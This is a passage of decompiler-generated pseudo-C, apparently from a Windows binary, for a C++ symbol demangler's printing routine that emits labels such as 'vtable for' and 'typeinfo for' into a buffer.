0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n                puVar22 = &stack0xffffffffffffff38;\n                sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, piVar24[4] + 1);\n                puVar17 = puVar22;\n                do {\n                    puVar16 = puVar17;\n                    uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                    uVar7 = uVar6 & 0x80808080;\n                    puVar17 = puVar16 + 1;\n                } while (uVar7 == 0);\n                bVar31 = (uVar6 & 0x8080) == 0;\n                if (bVar31) {\n                    uVar7 = uVar7 >> 0x10;\n                }\n                if (bVar31) {\n                    puVar17 = puVar16 + 6;\n                }\n                puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n                if (puVar20 == NULL) {\n                    iVar13 = *(arg1 + 0x100);\n                }\n                else {\n                    puVar17 = puVar20 + puVar22;\n                    iVar14 = *(arg1 + 0x100);\n                    do {\n                        uVar30 = *puVar22;\n                        if (iVar14 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            iVar13 = 1;\n                            iVar14 = 0;\n                        }\n                        else {\n                            iVar13 = iVar14 + 1;\n                        }\n                        puVar22 = puVar22 + 1;\n                        *(arg1 + 0x100) = iVar13;\n                        arg1[iVar14] = uVar30;\n                        arg1[0x108] = uVar30;\n                        iVar14 = iVar13;\n                    } while (puVar22 != puVar17);\n                }\n                puVar20 = 0x42d8e9;\n                do {\n                    uVar30 = *puVar20;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    puVar20 = puVar20 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar20 != 0x42d8ec);\n                piVar24 = *(piVar24 + 2);\n            }\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, piVar24);\n            break;\n        case 3:\n            uVar4 = *(arg1 + 0x128);\n            *(arg1 + 0x128) = 0;\n            piVar24 = arg3[1];\n            if (piVar24 == NULL) {\ncode_r0x0040794e:\n                *(arg1 + 0x130) = 1;\n            }\n            else {\n                ppiVar10 = *(arg1 + 0x120);\n                uVar7 = 0;\n                appiStack200[0] = &stack0xffffffffffffff38;\n                ppiVar9 = NULL;\n                do {\n                    ppiVar8 = appiStack200[0];\n                    *ppiVar8 = ppiVar9;\n                    iVar28 = *piVar24;\n                    uVar7 = uVar7 + 1;\n                    *(arg1 + 0x128) = ppiVar8;\n                    ppiVar8[1] = piVar24;\n                    *(ppiVar8 + 2) = 0;\n                    ppiVar8[3] = ppiVar10;\n                    if (4 < iVar28 - 0x1cU) {\n                        if (iVar28 == 4) {\n                            *(arg1 + 0x120) = &stack0xffffffffffffff28;\n                            ppiStack216 = ppiVar10;\n                            piStack208 = piVar24;\n                        }\n                        else if (iVar28 == 2) {\n                            piVar18 = *(piVar24 + 4);\n                            iVar28 = *piVar18;\n                            if (iVar28 != 0x45) goto code_r0x004051d4;\n                            while( true ) {\n                                piVar18 = *(piVar18 + 2);\n                                iVar28 = *piVar18;\ncode_r0x004051d4:\n                                if (4 < iVar28 - 0x1cU) break;\n                                if (uVar7 == 4) {\n                                    *(arg1 + 0x130) = 1;\n                                    return iVar28 - 0x1cU;\n                                }\n                                uVar6 = uVar7 - 1;\n                                uVar11 = uVar7;\n                                uVar7 = uVar7 + 1;\n                                iVar14 = uVar11 * 0x20;\n                                iVar13 = uVar6 * 0x20;\n                                *(&stack0xffffffffffffff38 + iVar14) = *(&stack0xffffffffffffff38 + iVar13);\n                                *(&stack0xffffffffffffff40 + iVar14) = *(&stack0xffffffffffffff40 + iVar13);\n                                *(&stack0xffffffffffffff48 + iVar14) = *(&stack0xffffffffffffff48 + iVar13);\n                                *(&stack0xffffffffffffff50 + iVar14) = *(&stack0xffffffffffffff50 + iVar13);\n                                *(&stack0xffffffffffffff38 + iVar14) = &stack0xffffffffffffff38 + uVar6 * 4 * 8;\n                                *(&stack0xffffffffffffff40 + iVar13) = piVar18;\n                                *(arg1 + 0x128) = &stack0xffffffffffffff38 + uVar11 * 4 * 8;\n                                *(&stack0xffffffffffffff48 + iVar13) = 0;\n                                *(&stack0xffffffffffffff50 + iVar13) = ppiVar10;\n                            }\n                        }\n                        ppiVar10 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                        if (*piVar24 == 4) {\n                            *(arg1 + 0x120) = ppiStack216;\n                            ppiVar10 = ppiStack216;\n                        }\n                        while (uVar7 != 0) {\n                            uVar7 = uVar7 - 1;\n                            uVar11 = uVar7;\n                            ppiVar10 = uVar11 * 0x20;\n                            if (*(&stack0xffffffffffffff48 + uVar11 * 0x20) == 0) {\n                                iVar13 = *(arg1 + 0x100);\n                                if (iVar13 == 0xff) {\n                                    arg1[0xff] = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                    iVar13 = 0;\n                                }\n                                arg3_00 = *(&stack0xffffffffffffff40 + uVar11 * 0x20);\n                                *(arg1 + 0x100) = iVar13 + 1;\n                                arg1[iVar13] = 0x20;\n                                arg1[0x108] = 0x20;\n                                ppiVar10 = fcn.00407fc0(arg1, arg2_00, arg3_00);\n                            }\n                        }\n                        *(arg1 + 0x128) = uVar4;\n                        return ppiVar10;\n                    }\n                    piVar24 = *(piVar24 + 2);\n                    appiStack200[0] = ppiVar8;\n                    if (piVar24 == NULL) goto code_r0x0040794e;\n                    appiStack200[0] = ppiVar8 + 4;\n                    ppiVar9 = ppiVar8;\n                } while (uVar7 != 4);\n                *(arg1 + 0x130) = 1;\n            }\n            break;\n        case 4:\n            uVar4 = *(arg1 + 0x128);\n            *(arg1 + 0x128) = 0;\n            piVar24 = arg3[1];\n            if ((((arg2 & 4) == 0) || (*piVar24 != 0)) || (bVar31 = piVar24[4] == 6,  !bVar31)) {\ncode_r0x004054ff:\n                fcn.00407f90(arg1, arg2_00, piVar24);\n                if (arg1[0x108] == '<') {\n                    iVar13 = *(arg1 + 0x100);\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar13 = 0;\n                    }\n                    iVar14 = iVar13 + 1;\n                    *(arg1 + 0x100) = iVar14;\n                    arg1[iVar13] = 0x20;\n                    arg1[0x108] = 0x20;\n                }\n                else {\n                    iVar14 = *(arg1 + 0x100);\n                }\n                if (iVar14 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar13 = 1;\n                    iVar14 = 0;\n                }\n                else {\n                    iVar13 = iVar14 + 1;\n                }\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = 0x3c;\n                arg1[0x108] = 0x3c;\n                fcn.00407f90(arg1, arg2_00, arg3[2]);\n                if (arg1[0x108] == '>') {\n                    iVar13 = *(arg1 + 0x100);\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar13 = 0;\n                    }\n                    appiStack200[0] = iVar13 + 1;\n                    *(arg1 + 0x100) = appiStack200[0];\n                    arg1[iVar13] = 0x20;\n                    arg1[0x108] = 0x20;\n                }\n                else {\n                    appiStack200[0] = *(arg1 + 0x100);\n                }\n                if (appiStack200[0] == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar13 = 1;\n                    appiStack200[0] = NULL;\n                }\n                else {\n                    iVar13 = appiStack200[0] + 1;\n                }\n                *(arg1 + 0x100) = iVar13;\n                arg1[appiStack200[0]] = 0x3e;\n                arg1[0x108] = 0x3e;\n            }\n            else {\n                iVar13 = 6;\n                pcVar19 = *(piVar24 + 2);\n                pcVar23 = \"JArray\";\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    bVar31 = *pcVar19 == *pcVar23;\n                    pcVar19 = pcVar19 + 1;\n                    pcVar23 = pcVar23 + 1;\n                } while (bVar31);\n                if (!bVar31) goto code_r0x004054ff;\n                fcn.00407f90(arg1, arg2_00, arg3[2]);\n                appiStack200[0] = fcn.004046f0(arg1, 0x42d8f4);\n            }\n            *(arg1 + 0x128) = uVar4;\n            break;\n        case 5:\n            appiStack200[0] = fcn.00402080(arg1, arg3 + 1);\n            if (appiStack200[0] != NULL) {\n                if (*appiStack200[0] != 0x2f) {\ncode_r0x0040549e:\n                    puVar3 = *(arg1 + 0x120);\n                    *(arg1 + 0x120) = *puVar3;\n                    ppiVar10 = fcn.00407f90(arg1, arg2_00, appiStack200[0]);\n                    *(arg1 + 0x120) = puVar3;\n                    return ppiVar10;\n                }\n                iVar28 = *(arg1 + 0x134);\n                while (0 < iVar28) {\n                    appiStack200[0] = appiStack200[0][2];\n                    iVar28 = iVar28 + -1;\n                    if ((appiStack200[0] == NULL) || (*appiStack200[0] != 0x2f)) goto code_r0x00406f6a;\n                }\n                if ((iVar28 == 0) && (appiStack200[0] = appiStack200[0][1],  appiStack200[0] != NULL))\n                goto code_r0x0040549e;\n            }\ncode_r0x00406f6a:\n            *(arg1 + 0x130) = 1;\n            break;\n        case 6:\n            uVar7 = *(arg3 + 1);\n            ppiVar10 = *(arg1 + 0x100);\n            if (uVar7 == 0) {\n                pcVar19 = \"this\";\n                do {\n                    cVar25 = *pcVar19;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n            }\n            else {\n                pcVar19 = \"{parm#\";\n                do {\n                    cVar25 = *pcVar19;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppiVar9 = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        ppiVar9 = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    pcVar19 = pcVar19 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[ppiVar9] = cVar25;\n                    arg1[0x108] = cVar25;\n                } while (pcVar19 != \"\");\n                puVar22 = &stack0xffffffffffffff38;\n                sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, uVar7);\n                puVar17 = puVar22;\n                do {\n                    puVar16 = puVar17;\n                    uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                    uVar7 = uVar6 & 0x80808080;\n                    puVar17 = puVar16 + 1;\n                } while (uVar7 == 0);\n                bVar31 = (uVar6 & 0x8080) == 0;\n                if (bVar31) {\n                    uVar7 = uVar7 >> 0x10;\n                }\n                if (bVar31) {\n                    puVar17 = puVar16 + 6;\n                }\n                puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n                if (puVar20 == NULL) {\n                    iVar13 = *(arg1 + 0x100);\n                }\n                else {\n                    iVar13 = *(arg1 + 0x100);\n                    puVar17 = puVar20 + puVar22;\n                    do {\n                        uVar30 = *puVar22;\n                        if (iVar13 == 0xff) {\n                            arg1[0xff] = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            iVar14 = 0;\n                            iVar13 = 1;\n                        }\n                        else {\n                            iVar14 = iVar13;\n                            iVar13 = iVar13 + 1;\n                        }\n                        puVar22 = puVar22 + 1;\n                        *(arg1 + 0x100) = iVar13;\n                        arg1[iVar14] = uVar30;\n                        arg1[0x108] = uVar30;\n                    } while (puVar22 != puVar17);\n                }\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    appiStack200[0] = 0x1;\n                    iVar13 = 0;\n                }\n                else {\n                    appiStack200[0] = iVar13 + 1;\n                }\n                *(arg1 + 0x100) = appiStack200[0];\n                arg1[iVar13] = 0x7d;\n                arg1[0x108] = 0x7d;\n            }\n            break;\n        case 7:\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            break;\n        case 8:\n            iVar13 = *(arg1 + 0x100);\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar13 = 0;\n            }\n            else {\n                iVar14 = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar13] = 0x7e;\n            arg1[0x108] = 0x7e;\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            break;\n        case 9:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"vtable for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 10:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"VTT for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0xb:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"construction vtable for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            pcVar19 = \"-in-\";\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            break;\n        case 0xc:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"typeinfo for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0xd:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"typeinfo name for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0xe:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"typeinfo fn for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0xf:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"non-virtual thunk to \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x10:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"virtual thunk to \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x11:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"covariant return thunk to \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x12:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"java Class for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x13:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"guard variable for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x14:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"TLS init function for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x15:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"TLS wrapper function for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x16:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"reference temporary #\";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            pcVar19 = \" for \";\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            iVar13 = *(arg1 + 0x100);\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x17:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"hidden alias for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x18:\n            uVar7 = *(arg3 + 2);\n            piVar24 = arg3[1];\n            if (uVar7 != 0) {\n                ppiVar10 = *(arg1 + 0x100);\n                iVar13 = 1;\n                do {\n                    uVar30 = *(piVar24 + iVar13 + -1);\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    iVar13 = iVar13 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (iVar13 != uVar7 + 1);\n            }\n            break;\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n            appiStack200[0] = *(arg1 + 0x128);\n            ppiVar10 = appiStack200[0];\n            if (appiStack200[0] == NULL) {\n                appiStack200[0] = NULL;\n            }\n            else {\n                do {\n                    if (*(ppiVar10 + 2) == 0) {\n                        if (2 < *ppiVar10[1] - 0x19U) break;\n                        if (uVar7 == *ppiVar10[1]) {\n                            ppiVar10 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n                            return ppiVar10;\n                        }\n                    }\n                    ppiVar10 = *ppiVar10;\n                } while (ppiVar10 != NULL);\n            }\n            goto code_r0x004047d7;\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x20:\n        case 0x21:\n        case 0x22:\n        case 0x25:\n        case 0x26:\ncode_r0x004047d0:\n            appiStack200[0] = *(arg1 + 0x128);\ncode_r0x004047d7:\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            apiStack184[1] = *(arg1 + 0x120);\ncode_r0x00404801:\n            piVar24 = arg3[1];\n            appiStack200[1] = arg3;\ncode_r0x00404805:\n            ppiVar10 = appiStack200[1];\n            apiStack184[0]._0_4_ = 0;\n            fcn.00407f90(arg1, arg2_00, piVar24);\n            if (apiStack184[0] == 0) {\n                fcn.00407fc0(arg1, arg2_00, ppiVar10);\n            }\n            *(arg1 + 0x128) = appiStack200[0];\n            break;\n        case 0x23:\n        case 0x24:\n            ppiVar10 = arg3[1];\n            uVar7 = *ppiVar10;\n            if (uVar7 == 5) {\n                ppiVar10 = fcn.00402080(arg1, ppiVar10 + 1);\n                if 